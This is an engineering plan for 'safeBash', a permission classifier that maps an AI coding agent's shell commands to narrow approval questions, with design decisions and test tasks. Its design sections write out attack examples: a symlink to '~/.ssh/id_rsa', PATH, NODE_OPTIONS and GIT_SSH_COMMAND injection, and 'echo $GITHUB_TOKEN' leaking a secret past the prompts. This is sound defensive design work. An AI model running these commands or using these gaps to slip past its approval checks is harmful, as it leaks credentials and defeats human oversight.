# safeBash: fewer broad prompts for coding work — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A line of ordinary coding commands (search, read, list, git reads, build, test) asks a question a policy can answer, instead of the broad `std::bash` question.

**Architecture:** Every change is a new or wider rule inside `planFor`. Nothing changes in how a plan is raised or run. Each rule keeps the two existing guarantees: the payload describes what bash will do, and a line with one unknown command asks `std::bash` for the whole line.

**Tech Stack:** Agency (`stdlib/safeBash.agency`), TypeScript helpers in `lib/stdlib/`, the tarsec bash parser (separate repository, pinned at 0.6.0).

**Spec:** There is no separate spec. Part 1 and Part 2 of this document are the design. Part 2 holds the decisions that need the owner's yes before any PR is built.

## Global Constraints

- All or nothing stays. A line with one command that has no rule asks one `std::bash` for the whole line.
- The payload tells the truth. A rule that cannot fill a truthful payload fails, and the line asks `std::bash`.
- A rule may ask for more than runs. It may never ask for less.
- No new statelog event type. The existing `safeBash plan` debug event is the measurement.
- Dev doc changes go in `docs/dev/stdlib/safe-bash.md`, as mechanism and rule only.
- Never hand-edit `docs/site/`. Run `make` and commit what it regenerates.
- After editing any `stdlib/*.agency` file, run `make` before running an Agency test.
- Run Agency tests with `--check-capabilities`, as CI does.
- No test runs a real `rm`, `mv`, or `cp` outside a folder the test made.

## Review Focus

1. A symlink inside a searched or expanded folder that points outside it. The command must not read through it under an approval that names the folder.
2. A path that an earlier command in the same line could replace before a later command reads it.
3. BSD and GNU programs disagreeing about a flag. Every new flag row needs a parity run on macOS and on CI.
4. A saved "always approve" rule for an innocent command that starts covering a dangerous spelling of the same program.
5. An environment variable reaching the model through a command that raises no `std::env` question.

The named test for each:

1. `grepThroughBashReadsWhatTheToolReads` (Task 1.4).
2. `missingPathAfterAProgramIsBroad` (Task 5.2). The `opaque` rule covers only a path that is missing when the plan is made. A path that exists is resolved at plan time, as today, and "Resolving the path when the plan is made" in the dev doc describes that gap.
3. The grep parity run in Task 1.4. Point 3 applies to a flag that changes what is read or written. A flag that only changes how output looks needs no parity row.
4. The `sed` rows in Task 4.4 and the `cp`, `mv`, and `ln` rows in Task 4.2.
5. The `printf` rows in `quietCommandsAskNothing` (Task 3.2).

---

# Part 1. Background

## What safeBash does today

The model calls one shell tool. That tool is `safeBash` in `stdlib/safeBash.agency`.

`safeBash` first calls `planFor(source, cwd)`. `planFor` runs nothing. It parses the string with the tarsec bash parser and looks at every command in it. For each command it tries to work out a narrow question. Here is an example:

```
cat package.json | head -20
```

`cat package.json` reads one file, so it asks `std::read` for that file. `head -20` reads only the pipe, so it asks nothing. The plan holds one `std::read`. The `recommended` policy approves a read under the launch folder, so the user sees no prompt.

When `planFor` cannot describe one command, the whole line asks `std::bash`. The payload of `std::bash` is the command text. No policy can approve that in advance, because the text could do anything. So the user gets a prompt and has to read the line.

## What I measured

I collected every bash command in five logs: `~/.agency-agent/perry-log.jsonl`, `~/perry/log.jsonl`, and the three `log*.jsonl` files in the main checkout. That gave 89 distinct commands. I ran each through today's `planFor` and checked every effect against the saved policy in `~/.agency-agent/policy.json`.

| Result | Lines |
|---|---|
| No prompt | 21 |
| A narrow question the policy does not answer yet | 17 |
| The broad `std::bash` question | 51 |

About 40 of the 89 lines are one session exploring a command-line program, so the sample is not all coding. To cover coding, I also ran 115 common coding spellings through `planFor`. The examples in this document come from both runs.

Lines that hold the usual coding commands do worst:

| Lines that contain | Total | Ask `std::bash` |
|---|---|---|
| `grep` | 22 | 18 |
| `find` | 8 | 8 |
| `git` | 10 | 8 |

## Why the number is so high

Models write several commands on one line. Here is a real line from the Perry log:

```
grep -rn "_withRecordLock" src/ --include="*.ts" | head -20; echo ---; grep -n "isProcessAlive" src/engine/engineInfo.ts; echo ---; grep -n "SESSION_POLICIES_DIR\|saveCarriedPolicy\|export" node_modules/agency-lang/stdlib/dist/src/agent/driver.d.ts 2>/dev/null | head -40 || find node_modules/agency-lang -name "driver*" | head
```

This line has seven commands. Five of them already have a rule. The first `grep` does not, and the `find` does not. So the whole line asks `std::bash`.

The all-or-nothing rule is correct, and this plan does not change it. What it means for this work is that a line gets better only when every command in it has a rule. So the fixes below matter together more than each one matters alone. Fixing `grep` alone moves 3 of the 51 lines. Fixing every group this plan covers moves about 28.

## The groups

I tagged every blocker on each of the 51 broad lines. A line can have several.

| Blocker | Lines | PR |
|---|---|---|
| `$?` in an `echo` | 14 | 3 |
| A directory grep in a pipe, with `--include`, with two paths, or with a flag after the path | 11 | 1 |
| `pwd`, `which`, `command -v`, `printf`, `type` | 10 | 3 |
| A git read with no rule | 8 | 2 |
| `< /dev/null` | 7 | 3 |
| `TERM=dumb` or `timeout N` in front of a command | 6 | 3 |
| A path that does not exist when the plan is made | 4 | 5 |
| A glob in a path | 3 | 6 |
| `find` with `-newermt` or `\( \)`, or a `find` of a symlink | 4 | not in this plan |
| `for` loops, `$(...)`, heredocs, `{ }` groups, a pipe into `awk` or another program | 16 | not in this plan |

The last row is the hard case. No rule can describe those lines, and this plan leaves them asking `std::bash`.

---

# Part 2. Answers and decisions

This part answers the ten points from the review of the summary, in order. Seven of them end in a decision that needs a yes. Each decision has a recommendation.

## 1. grep needs to know more

Yes. But the main gap is not flags. It is one rule:

```
grep -rn "planFor" lib             # no prompt today
grep -rn "planFor" lib | head -20  # std::bash today
```

The first line is a lone grep. safeBash runs the grep tool's own search for it, in process, and asks `std::grep`. The second line is the same search with a pipe. A pipe means the line runs through bash, and today a directory grep through bash always asks `std::bash`.

The reason for that rule is in the dev doc. The grep tool skips six folders: `node_modules`, `.git`, `dist`, `build`, `.next`, and `.cache`. Real `grep -r` reads all of them, including `.git/config`. Both would ask `std::grep` with the same folder. So a policy that approved the folder for the tool would also approve real grep reading `.git/config`.

**The proposed design: safeBash writes the grep command it runs.** It already does this for `git` and `gh`. For a directory grep through bash, it writes the six folders into the command:

```
# The model writes:
grep -rn "planFor" lib --include="*.ts" | head -20

# bash runs:
grep -r -n --include='*.ts' --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist --exclude-dir=build --exclude-dir=.next --exclude-dir=.cache planFor lib | head -20

# It asks:
std::grep { dir: "<cwd>/lib", pattern: "planFor", ... }
```

With those flags, real grep reads no folder the tool skips. I checked this on macOS grep with a fixture that had a match in `.git/config`, in `node_modules`, and in a nested `build` folder. None of them printed.

Three more facts I checked on macOS grep (BSD grep 2.6.0):

- `grep -r` does not follow a symlink below the folder it searches. A link in the fixture that pointed at a file outside did not print.
- `"a\|b"` is alternation in a basic pattern.
- When the folder named on the command line is itself called `dist`, `--exclude-dir=dist` makes grep search nothing. The grep tool searches a folder you name. So a grep whose named folder has one of the six names stays broad.

One difference remains. The grep tool also skips what `.gitignore` ignores, and real grep does not. I do not think this breaks the payload, for this reason: the grep tool has a `respectGitignore` parameter, and the `std::grep` effect has no field for it (`stdlib/shell.agency:68`). A call to the tool with `respectGitignore: false` asks the same question. So an approval of `std::grep` for a folder already covers the ignored files in it.

Writing the command also settles flag order. The model writes `grep -n x file -A 5`. safeBash writes the flags first, so every grep reads them as flags.

> **Decision 1.** On 2026-10-31 the decision was that a directory grep through bash asks `std::bash`. This design changes that. Options:
>
> - **A (recommended).** safeBash writes the `--exclude-dir` flags. A directory grep through bash asks `std::grep` per folder.
> - **B.** Keep the rule. Build an in-process pipeline runner so the tool's search can feed `head`. That is ADI-261. It is several days of work, and it does not help a line that also holds `ls` or `find`, because that line must go through bash anyway. The example line above would stay broad.
> - **C.** Keep the rule and accept the prompts.
>
> The cost of A: no policy file changes, but every saved rule that approves `std::grep` for a folder will now also approve real grep, run through bash, on that folder. Today such a rule approves only the grep tool's search.

## 2. All or nothing

I agree it is correct, and I was not arguing against it. I named it only to explain why the count is high: a five-command line needs five rules.

I do not see a case where splitting makes sense. A person who is shown half a line cannot judge what the model is doing. And approving the known half separately saves no prompt, because the unknown half still asks. That was the reasoning on 2026-10-30, and the data does not change it. This plan keeps the rule.

## 3. Does `$?` need a parser change in tarsec?

Yes. The parser's header lists it as rejected: "the special parameters `$?` / `$@` / `$$`". So the line never reaches the classifier.

The change is small. The parser accepts `$?` as a variable word named `?`, bare and inside double quotes, and `astToBash` prints it back. `$@` and `$$` stay rejected.

Nothing changes in safeBash for the common case. An `echo` on the bash path already takes any words and asks nothing (`verbEffects`, `stdlib/safeBash.agency:523`). Every other rule already refuses a word that is not literal. So `pnpm test; echo "exit=$?"` asks one `std::exec`, and `cat $?` still asks `std::bash`.

`$?` holds a number, so it cannot leak anything.

This needs a tarsec PR, a publish by the owner, and a pin bump. That is the same sequence as tarsec 0.5.6 through 0.5.8.

## 4. `pwd`, `which`, and other harmless commands

There are two kinds of command here, and they should be handled differently.

**Kind one: commands that reveal nothing and change nothing.** These are `pwd`, `true`, `false`, `:`, `printf`, `basename`, `dirname`, `sleep`, `date`, `uname`, `whoami`, `hostname`, `which`, `command -v`, and `type`. I would treat each like `echo`: inside a line, it adds no question. So `pwd; ls src` asks one `std::ls`.

**Kind two: commands that read a file or change one.** These already have effects that fit, and they should raise them. That is points 7 and 9. For reads, the prompt already offers the broad answer you describe. The `as` answer saves "always approve all reads in this folder" under every effect in the `FileRead` set (`SHARED_APPROVAL_SETS` in `lib/runtime/alwaysChoices.ts`). So no new prompt option is needed for reads. The gap is only that the commands do not raise read effects yet.

**A line with nothing but kind-one commands** is the open question. Today such a line asks `std::bash`, because of the rule that every shell spawn raises at least one effect. That is why a lone `pwd` and a lone `echo "---"` prompt today.

> **Decision 2.** What does a line of only harmless commands ask?
>
> - **A (recommended).** One new effect, `std::bash::readonly { command, cwd }`. `recommended` approves it. The audit rule holds, and a strict policy can still reject it. It is raised only when every word in the line is literal or is `$?`. So `echo $GITHUB_TOKEN` alone still asks `std::bash`.
> - **B.** Run the line with no question. This breaks the audit rule.
> - **C.** Keep asking `std::bash`.
>
> The owner chose the name `std::bash::readonly` on 2026-11-20. The architecture review recommends C, because no line in the logs is made only of such commands. See the review file beside this plan. Task 3.5 is built only if the owner keeps A after reading that.

`env` and `printenv` are not on the list. They print the environment, which is what `std::env` guards.

`which` and `whereis` are in `NO_EXEC_PROGRAMS` today so that the model cannot look up the `agency` binary. Both stay in that list. The new rule accepts a `which` whose names do not end in `agency`, and any other `which` falls through to the list, as today.

`printf` is the one command here that needs care. `printf -v PATH /tmp/evil` sets the shell variable `PATH`, so the next command in the line would run a program from `/tmp/evil` under an approval for the real one. The rule for `printf` is that its first word is literal and does not start with `-`, and every other word is literal or `$?`.

**Wrappers.** `timeout 60 pnpm test` has no rule today because `timeout` runs another program. The rule I propose reads through it: `timeout` followed by one number asks whatever the inner command asks. So the line asks `std::exec { pnpm, test }`. Any flag on `timeout` has no rule. `time` cannot be done here, because the parser rejects it as a reserved word. `npx` stays as it is, for the reason in the dev doc.

## 5. Assignments and `/dev/null`

**Assignments are a real risk, so most must still ask.** A leading assignment can make an approved program run other code:

```
PATH=/tmp/evil:$PATH pnpm test
NODE_OPTIONS='--require ./x.js' pnpm test
GIT_SSH_COMMAND='sh -c ...' git fetch
```

The `std::exec` payload has no field for the environment. So a saved rule for `pnpm test` would approve all of these.

A small set of names only changes how output looks. I would allow those, with a literal value, and keep refusing every other name:

```
TERM  NO_COLOR  FORCE_COLOR  CLICOLOR  CLICOLOR_FORCE  COLUMNS  LINES  LC_ALL  LANG  TZ
```

The value must be made of letters, digits, and `. _ - :` only. A value with a `/` has no rule, because the C library reads `TZ=/some/path` and a locale name with a slash as a file to open.

> **Decision 3.** Is that list right? Two common names are left out. `NODE_ENV` changes which config a program loads, so `NODE_ENV=production pnpm migrate` under a saved rule for `pnpm migrate` would be a surprise. `CI` changes what programs do, not how output looks: `pnpm install` uses the frozen lockfile under it, and test runners change mode. I recommend leaving both out.

**`/dev/null`: yes, all of it is a no-op.** Output to `/dev/null` already asks nothing. Two spellings are still missing:

- `cmd < /dev/null`. This gives the command an empty stdin. safeBash already runs every line with an empty, closed stdin. So it changes nothing, and it should ask nothing. Today it fails twice: as a read of a device, and as "a program fed by `<`".
- `cmd &> /dev/null`. This discards both streams. Today `&>` has no rule.

## 6. A file written and then read in the same line

```
gh pr diff 34 > /tmp/pr34.diff 2>&1; wc -l /tmp/pr34.diff
```

`wc` fails at plan time because the file does not exist yet. I think this is worth fixing, and it is less work than it looks, because it shares its mechanism with point 7.

The classifier already walks the line in order and carries one fact with it: the working directory after each `cd`. This adds a second fact: the files the line has asked to write so far. When a read names a missing path that is in that list, the read resolves to it.

The redirect has already asked `std::write` for that exact path. The read asks `std::read` for the same path. Both payloads are true.

This is the pattern models use to keep long output, so it will show up in every test run: `pnpm test > /tmp/out.txt 2>&1; tail -50 /tmp/out.txt`.

## 7. Existence probes

```
ls nope 2>/dev/null || echo missing
cat nope.txt
```

Agreed, this is easy. Today a missing path has no rule. The new rule: a missing path whose parent folder exists resolves by its parent.

- `ls nope` asks `std::ls` for the parent folder. That is what `ls file` already asks.
- `cat nope.txt` asks `std::read` for that name in the parent folder. That is the payload the read tool raises for a missing file.

There is one condition. Nothing earlier in the same line may be able to create the path as something else. Consider:

```
ln -s ~/.ssh/id_rsa x; cat x
```

At plan time `x` is missing. If the rule resolved it by its parent, the `cat` would ask `std::read` for `x` in the launch folder, and `recommended` would approve it. Then it would read the key.

So the classifier carries a third fact: whether the line has run a program it cannot see into. A command that asks `std::exec` sets it. After that, a missing path has no rule, as today. In the `ln` line above, `ln` asks `std::exec`, so `cat x` still asks `std::bash`.

Points 6 and 7 are one PR.

## 8. Globs

The parser has read glob words since tarsec 0.5.6. The classifier refuses them almost everywhere. Only a program that asks `std::exec` carries one through. That is ADI-247, which was never built.

The reason it is not trivial: the files a glob names are not known until bash expands it, and each file needs its own check. `cat src/*.md` could match a symlink to a file outside the project.

**The design: safeBash expands the glob itself and writes the result into the command.**

```
# The model writes:
wc -l lib/*.ts

# bash runs:
wc -l 'lib/a.ts' 'lib/b.ts' 'lib/c.ts'

# It asks one std::read per file, each resolved like any other path.
```

Because safeBash writes the list, what was approved is exactly what runs. If safeBash's expansion ever differed from bash's, the model would see a slightly different file list. Nothing unapproved would be read.

Rules:

- `*`, `?`, and `[...]` in any segment. No `**`, which bash treats as `*` by default.
- A name that starts with a dot matches only when the pattern segment starts with a dot, as in bash.
- No match: bash passes the pattern through as text, and the program says "No such file". safeBash does the same and writes the pattern in single quotes. The line then follows the missing-path rule from point 7.
- More than 200 matches has no rule.
- Globs get a rule for the read verbs, the listing verbs, and grep paths. Not for `rm`, `git`, or `gh`.

This changes the first rule in the dev doc, "safeBash never expands a variable or a glob itself". Variables stay unexpanded.

> **Decision 4, deferred 2026-11-20.** Globs wait for a follow-up. The design above is kept for it.

## 9. File commands that ask the wrong question

Agreed. Each command should raise the most specific effect that exists:

| Command | Asks today | Should ask |
|---|---|---|
| `mkdir -p a/b` | `std::exec { mkdir, -p }` | `std::mkdir { dir }` per folder |
| `cp a b` | `std::exec { cp, a }` | `std::copy { src, dest }` |
| `mv a b` | `std::exec { mv, a }` | `std::move { src, dest }` |
| `touch a` | `std::exec { touch, a }` | `std::write { dir, filename, content: "", mode: "append" }` |
| `cmd \| tee out.log` | `std::bash` | `std::write` for `out.log`, like `>` |
| `sed -n 10,20p f` | `std::exec { sed, -n }` | `std::read` for `f` |
| `stat f` | `std::exec` | `std::ls` for the folder, like `ls -l f` |
| `md5sum f`, `shasum f`, `file f` | `std::exec` | `std::read` for `f` |

Two of these fix a real over-approval today. "Always approve" for `cp package.json /tmp/x` saves the pair `cp` and `package.json`. "Always approve" for `mkdir -p x` saves `mkdir` and `-p`, which covers a `mkdir -p` anywhere on the machine.

The `with-writes` policy already approves `std::mkdir`, `std::copy`, and `std::move` under the launch folder. So these lines stop prompting under that policy with no policy change.

`sed -n` is on the list because it is how models read a range of lines. The rule takes only `-n` and a script of the form `Np` or `N,Mp`. Any other `sed` still asks `std::exec`.

**The effect-set idea.** `FileWrite` already exists as an effect set (`stdlib/effectSets.agency`). What does not exist is a prompt answer for it. The `as` answer is offered only for sets listed in `SHARED_APPROVAL_SETS`, and only `FileRead` is listed.

`FileWrite` cannot simply be added to that list. The `as` answer needs every member to have the same scope, and they differ: `std::write`, `std::edit`, and `std::mkdir` pin `dir`, while `std::copy` and `std::move` pin `src` and `dest`, and `std::remove` pins `target`. The dev doc also warns against a folder step on `std::remove`.

> **Decision 5, deferred 2026-11-20 with PR 7.** Add a prompt answer "always approve all writes in this folder"?
>
> - **A (recommended).** Yes, for the three effects that pin `dir`: `std::write`, `std::edit`, and `std::mkdir`. It gets the folder step, which stops at the launch folder. It never sets `matchDotFolders`, so a write under `.git` still asks. Copy, move, and remove keep their own questions.
> - **B.** No new answer. A person who wants this starts the agent with `--policy with-writes`, which already does it for the launch folder and also covers copy, move, and remove.
>
> This is a change to the approval prompt, not to safeBash. It is PR 7, and it can be dropped without affecting the others.

## 10. Lines no rule can describe

Agreed. `for` loops, `$(...)`, heredocs, brace groups, and pipes into `awk` or `node -e` stay on `std::bash`. After PRs 1 to 6, these are 16 of the 51 lines.

## One thing found on the way

`echo` on the bash path asks nothing whatever its words are. So this line asks only the git question:

```
git status && echo $GITHUB_TOKEN
```

The model then reads the token, and no `std::env` question was asked. This is already noted as unanswered in the gh work. It is not made worse by this plan: Decision 2 keeps a line with a variable off the new quiet effect, and `printf` takes only literal words and `$?`, so it is not a second spelling of the same leak. The fix would be for a variable word in an `echo` or `printf` to ask `std::env` for that name.

> **Decision 6, made 2026-11-20.** Filed separately as ADI-356. This plan does not fix it.

## Decision 7: git reads

Point 3 of the group table is eight lines of git reads with no rule. The git rule today is "recognized only when an existing `std::git::*` effect describes it completely". None of these subcommands has an effect of its own. Each one shows a part of what an existing effect already shows, and the existing rule already allows a flag that "shows less". I propose reading these subcommands the same way:

| Command | Asks | Why the payload is true |
|---|---|---|
| `git rev-parse <ref>`, alone or with `--short`, `--abbrev-ref`, or `--verify` | `std::git::log { ref }` | It prints the hash or name of a commit that `git log <ref>` prints. |
| `git rev-parse --show-toplevel`, `--git-dir`, `--is-inside-work-tree` | `std::git::status` | It prints where the repository is. |
| `git merge-base A B` | `std::git::log` for `A` and for `B` | It prints one commit from the history of both. |
| `git ls-files [path]` | `std::ls { dir, recursive: true }` | It lists names under the folder. `ls -R` lists more. |
| `git grep <pattern> [-- paths]` | `std::grep` per path | It searches tracked files under the folder. safeBash writes exclude pathspecs for the six skipped names, so it reads no file the tool skips. |
| `git grep <pattern> <ref> [-- paths]` | `std::git::show { ref }` | It reads file contents from that commit, as `git show ref:path` does. |
| `git worktree list` | `std::git::branchList` | It prints branches and where each is checked out. |
| `git --no-pager <sub>` | what `<sub>` asks | safeBash already writes `-c core.pager=cat`. The flag is dropped. |
| `git -C <dir> <sub>` | what `<sub>` asks, in `<dir>` | It is `cd <dir> && git <sub>`. safeBash writes the resolved folder. |
| `git log --format=<text>`, `--pretty=<text>` | `std::git::log` | A format changes how the result is shown. |

> **Decision 7, made 2026-11-20.** These map onto existing effects, as above. `git fetch` is not in the table. It uses the network and writes to `.git`, so it needs a new `std::git::fetch` effect and its own decision. This plan leaves it on `std::bash`.

---

# Part 3. The PRs

Order is by how many lines each PR helps, with PR 3 pulled early because the tarsec publish takes a round trip.

| PR | What | Depends on | Size |
|---|---|---|---|
| T | tarsec: accept `$?` | Decision: none | half a day, plus a publish |
| 3a | The tarsec pin and the `$?` test (Task 3.1) | PR T published | an hour |
| 1 | grep through bash | Decision 1 | 2 to 4 days |
| 2 | git reads | none | 1 to 2 days |
| 3 | Quiet commands, wrappers, assignments, `/dev/null` | Decisions 2 and 3 | 2 days |
| 4 | File commands raise file effects | none | 2 days |
| 5 | Missing paths and files the line writes | none | 2 to 4 days |
| 6 | Globs | follow-up, not built in this round | 2 to 3 days |
| 7 | "Always approve all writes in" | follow-up, not built in this round | 1 day |

## Scope, decided 2026-11-20

The rule the owner set: a part that is easy stays, whether or not the logs show it in use, because adding commands one at a time later is more painful than adding them together now. A part that is hard and unused waits.

| Part | Stays or waits | Why |
|---|---|---|
| All fifteen quiet commands | Stays | Each is one table row. |
| `touch`, `stat`, `file`, checksums | Stays | Each is one table row on a rule that already exists. |
| Every git read in Decision 7's table | Stays | Each is a row or a short function. See the note on `git grep` in PR 2. |
| `cp` and `mv` (Task 4.2) | Waits | No logged use, and the rule has six separate things to get right. They are listed under Task 4.2. |
| Globs (PR 6) | Waits | It is a second implementation of part of bash, and it changes the first rule of safeBash. The section stays in this document as the design for the follow-up. |
| "Always approve all writes in" (PR 7) | Waits | It changes the approval prompt, not safeBash, and needs its own design. |

After PR 5 merges, read the corpus test again. If lines with a glob or with `cp` and `mv` are a visible share of what is left, build the follow-up then.

The sizes assume the decisions come back as recommended. The hardest open question in each PR is named in its section. PR 1 has a range because its four grep facts were checked on macOS only, and PR 5 has one because its first task changes the signature of every `classify` function.

Each PR is its own branch from `main` and its own worktree under `packages/agency-lang/.worktrees/`. PRs 1, 2, 4, and 5 touch different functions and can be built in any order. PR 6 uses PR 5's missing-path rule.

Every PR ends with the same three steps, which are not repeated below:

- [ ] Update `docs/dev/stdlib/safe-bash.md`: the rule, the table row, and the reason. No history.
- [ ] Run `make`, then `pnpm run typecheck`, `pnpm run lint:structure`, and `pnpm run fmt:ts` on the files changed. Commit what `make` regenerated under `docs/site/` and `stdlib/docs/`.
- [ ] Run `pnpm run agency test tests/agency/safeBash.agency --check-capabilities > <scratch>/safebash.txt 2>&1` and `pnpm vitest run lib/stdlib/safeBash.test.ts > <scratch>/unit.txt 2>&1`. Read the files.

## The measurement test, added in PR 1

**Files:**
- Create: `tests/agency/safeBash-corpus.agency`
- Create: `tests/agency/safeBash-corpus.json`

The 115 probe spellings become a committed test. Each row is a command and its expected outcome. Every later PR flips rows from `broad` to `narrow` or `shellFree`, so the diff of this one file shows what each PR bought.

- [ ] Write `safeBash-corpus.json` as a list of `{ command, outcome, effects }`. `effects` is the list of effect names. Use only paths that exist in the repository at a fixed place, such as `package.json` and `lib`.
- [ ] Write one node, `corpusOutcomes`, that returns the rows whose plan differs from the file. The expected value is `[]`.
- [ ] Fill the file from today's `planFor`, so the test passes before any rule changes.

The logged commands are not committed. They hold paths and text from private sessions.

## PR T: tarsec accepts `$?`

**Files (tarsec repository):**
- Modify: `lib/parsers/bash/parsers.ts`, the variable parser near line 340
- Modify: `lib/parsers/bash/astToBash.ts`
- Modify: `lib/parsers/bash/index.ts`, the header comment
- Test: `lib/parsers/bash/parsers.test.ts`, `lib/parsers/bash/astToBash.test.ts`

**Interfaces:**
- Produces: `$?` parses as `{ tag: "variable", name: "?" }`. Inside double quotes it is a part of the `doubleQuoted` word, as `$var` is.

- [ ] **Step 1: failing tests.** Rows: `echo $?`, `echo "exit=$?"`, `echo "a$?b"`, `echo $?x` (bash reads `$?` then `x`, so one word of two parts). Rejected rows that must stay rejected: `echo $@`, `echo $$`, `echo ${?}`.
- [ ] **Step 2: accept `?` as a variable name** in the two places a `$name` is read. Use the existing combinators. `${?}` stays rejected.
- [ ] **Step 3: print it back.** `astToBash` writes `$?` bare, and unescaped inside double quotes. Add a round-trip row for each test above.
- [ ] **Step 4: update the header comment.** Move `$?` from REJECTED to SUPPORTED.

The owner publishes. PR 3 bumps the pin.

## PR 1: grep through bash

**The hardest question:** whether GNU grep on CI agrees with BSD grep on the four facts in Decision 1. The parity test in Task 1.4 answers it. If GNU differs on one, that spelling stays broad and the dev doc says so.

**Files:**
- Modify: `stdlib/safeBash.agency`: `GREP_FLAGS`, `splitFlags`, `readGrep`, `grepWords`, `grepSearchEffects`, `simpleCommandRule`
- Modify: `lib/stdlib/grepDialect.ts`: export the skip list
- Test: `tests/agency/safeBash.agency`, `tests/agency/stdlib/grep-fixtures/`

### Task 1.1: a flag joined to a quoted value is a flag

`--include="*.ts"` does not parse as a flag word. The parser returns an `interpolatedVariable` word with two parts: the literal `--include=` and a quoted part. Today `splitFlags` sees a positional, and the line fails with "the grep pattern is not literal".

**Interfaces:**
- Produces: `def joinedFlag(word: Word): FlagWord | null` in `stdlib/safeBash.agency`. It returns a flag word when the word's first part is a literal that starts with `-` and ends with `=`, and every other part is a quoted literal with no variable. `splitFlags` calls it on each word before deciding the word is a positional, and only for a table that asks for it.
- Produces: a new optional field on `FlagSpec`, `quotedValues: boolean`. Only `GREP_FLAGS` sets it in this PR. `splitFlags` is shared by every table, and a quoted value can hold text a bare value cannot: a space, a comma, a glob character. The `gh` rule refuses a value with a quote in it, and the `find` rule refuses `-name=x` on purpose. Neither may start accepting a joined value as a side effect of a grep change.

- [ ] Test node `joinedFlagWords`: `grep --include="*.ts" x lib` and `grep --include='*.ts' x lib` each split into a valued flag. `grep --include="$X" x lib` does not. `gh pr list --label="bug,urgent"` and `find . -name="*.ts"` plan exactly as they do today.
- [ ] Implement `joinedFlag` and call it from `splitFlags`.
- [ ] Check that `refuseQuotedOption` still refuses `grep "-R" src`. That word is wholly quoted, so `joinedFlag` returns null for it.

### Task 1.2: repeatable filter flags

**Interfaces:**
- Produces: a new optional field on `FlagSpec`, `repeatable: string[]`. `splitFlags` takes a valued flag in this list any number of times. Every other valued flag is still taken once.
- `GREP_FLAGS.valued` gains `--include`, `--exclude`, and `--exclude-dir`, all repeatable. `SHELL_FREE_GREP_FLAGS` does not gain them, because the tool's search cannot carry them out.

Each of the three only narrows what grep reads, so the payload stays true.

- [ ] Test rows in `grepFlagTable`: `grep -rn x lib --include="*.ts" --include="*.md"` splits. `grep -e a -e b f` is still refused.
- [ ] Implement.

### Task 1.3: safeBash writes the grep command

**Interfaces:**
- Produces: `def grepCommand(split: SplitArgs, pattern: Word, paths: Word[], excludes: string[], redirects: Redirect[]): SimpleCommand`. It writes these, in order:
  1. `grep`.
  2. Every flag from `split` except `-e`, built from the checked data, as `flagWords` does for git.
  3. For each entry in `excludes`, `--exclude-dir=<name>` and `--exclude=<name>`. The grep tool's walk skips any entry with one of the six names, a file as well as a folder (`lib/stdlib/shell.ts:501`). In a git worktree `.git` is a file, and `--exclude-dir` alone would let real grep read it.
  4. `-e`, then the pattern word. The pattern is always written this way, whether the model gave it with `-e` or as a word, so it is written once and a pattern that starts with `-` is never read as a flag.
  5. `--`, then the path words. With `-r` and no path, it writes `.`. GNU grep searches the working folder in that case, and BSD grep reads stdin, and the payload names the working folder.
- Produces: `_skipDirNames(): string[]` in `lib/stdlib/shell.ts`, beside `SKIP_DIRS`, which it returns as a list.
- A test that fails if the names `grepCommand` writes differ from `SKIP_DIRS`. That equality is the safety argument for this PR.
- Changes: `GrepRead`'s `search` arm holds `calls: GrepCall[]`, one per path. `grepSearchEffects` returns a `SimpleRule`, so `simpleCommandRule` gets a `"grep"` branch beside `"git"` and `"gh"`.
- A flag after the first positional is accepted only for a grep that safeBash rewrites, which is the `search` form. A grep that reads a pipe runs as the model wrote it, so `pnpm test | grep FAIL -v` keeps today's refusal: some greps read that `-v` as a file name. `readGrep` splits with `optionsFirst: false` and then, when the answer is `stdin`, refuses if any flag came after a positional. `SplitArgs` needs one new field for that, `lateFlag: boolean`.

Rules, each with its reason in a comment:

1. A file path: one `std::grep` with `file` set. No excludes are written for it.
2. A folder path with `-r`: one `std::grep` with that `dir`. The excludes are written.
3. A folder path whose own last segment is in the skip list: no rule. With `--exclude-dir=dist`, `grep -r x dist` searches nothing. The check looks at the path as written and at its real path, so `grep -rn x .` run inside a folder called `build` has no rule either.
4. A folder path without `-r`: no rule, as today.
5. Several paths: one `std::grep` each.
6. The pattern must be one literal word. It goes in the payload as written.

- [ ] Test node `grepThroughBashAsksStdGrep`, rows as `[command, outcome, effect names]`:

| Command | Outcome | Effects |
|---|---|---|
| `grep -rn hello . \| head -20` | narrow | `std::grep` |
| `grep -rn "a\|b" src` | narrow | `std::grep` |
| `grep -rn hello src lib` | narrow | `std::grep`, `std::grep` |
| `grep -rn hello src --include="*.ts"` | narrow | `std::grep` |
| `grep -n hello one.txt -A 5` | narrow | `std::grep` |
| `grep -rn hello node_modules \| head` | broad | `std::bash` |
| `grep -rn hello node_modules/pkg \| head` | narrow | `std::grep` |
| `grep -n hello src` | broad | `std::bash` |
| `grep -rn hello src` | shellFree | `std::grep` |

- [ ] Test node `grepRunsWhatItAsked`: for the first, fourth, and fifth rows, compare the text the plan runs with the exact expected string.
- [ ] Implement.
- [ ] Find every row of `tests/agency/safeBash.agency` that expects a directory grep through bash to be broad. Search for the reason text "would search a directory" and for `grep -r` rows in `planReasons`, `planOutcomes`, and the grep nodes. Each becomes narrow, except a row whose folder has a skip name.

### Task 1.4: parity on a real tree (Review Focus 1 and 3)

- [ ] Add to `tests/agency/stdlib/grep-fixtures/` a nested tree, made by the test in a temp folder, not committed: `.git/config`, `node_modules/p/i.js`, `src/a.ts`, `src/dist/b.js`, `src/sub/build/c.js`, each holding the word `needle`. Also a file named `src/build` and a file named `src/sub/.git`, each holding `needle`. All of this goes in a folder `tree/`. Beside it, not inside it, make `outside/s.txt` with `needle`. Add a symlink `tree/src/link.txt` to that file, and a folder symlink `tree/src/linkdir` to `outside`. Delete everything with `safeDeleteDirectoryWithin` in a `finally`.
- [ ] Test node `grepThroughBashReadsWhatTheToolReads`: with `tree` as the working folder, run `grep -rn needle . | sort` through `safeBash` under a handler that approves `std::grep`. The output must be exactly `./src/a.ts:1:needle`.
- [ ] Parity rows for rule 3 and for the no-path form: `grep -rn needle | sort` prints the same line, and `grep -rn needle src/dist | sort` is broad.
- [ ] The same node runs the grep tool on the same folder with `respectGitignore: false` and compares the file names.

This test runs on macOS locally and on GNU grep in CI. A difference between them is a finding, not a flake.

## PR 2: git reads

